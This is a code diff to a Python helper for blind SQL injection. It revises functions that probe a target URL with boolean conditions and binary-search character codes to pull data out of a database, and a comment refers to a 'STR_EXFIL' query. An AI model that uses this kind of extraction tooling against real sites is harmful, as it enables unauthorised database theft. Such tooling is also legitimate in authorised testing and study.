@@ -87,6 +87,7 @@ def get_count(
     for i in range(lower_bound, upper_bound):
         if(question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, ordinal=str(i), query_encoder=query_encoder, comment=comment, debug=debug)):
             return i
+# returns false on an inconclusive search
 def binary_search(
     req:Callable[[requests.models.Response],str],
     sqli_truth_condition:Callable[[requests.models.Response], bool],
@@ -94,21 +95,22 @@ def binary_search(
     base_query:Callable[[str],str],
     outer_query:Callable[[str,str,str],str],
     inner_query: str,
-    pos:int,
     lo:int,
     hi:int,
     query_encoder:Callable[[str], str]=None,
     comment:str = "",
     debug:bool=False):
+    ans = False
     while lo <= hi:
         mid = lo + (hi - lo) // 2
-        sub_query = outer_query(inner_query, pos, mid) # see QUERIES['STR_EXFIL']
-        ans = question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, ordinal=str(mid), query_encoder=query_encoder, comment=comment, debug=debug)
+        sub_query = outer_query(inner_query, mid)
+        ans = question(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, query_encoder=query_encoder, comment=comment, debug=debug)
         if (ans):
             lo = mid + 1
         else:
             hi = mid - 1
-    return lo
+    return lo if ans else ans
+'''
 def get_string(
     req:Callable[[requests.models.Response],str],
     sqli_truth_condition:Callable[[requests.models.Response], bool],
@@ -125,7 +127,7 @@ def get_string(
     for i in range(1, strlen + 1):
         sub_query = outer_query(inner_query)
         s += binary_search(req=req, sqli_truth_condition=sqli_truth_condition,url=url, base_query=base_query, sub_query=sub_query, pos=i, lo=32, hi=126, query_encoder=query_encoder, comment=comment, debug=debug)
-        
+'''       
 def report(
     url:str,
     base_query:Callable[[str],str],
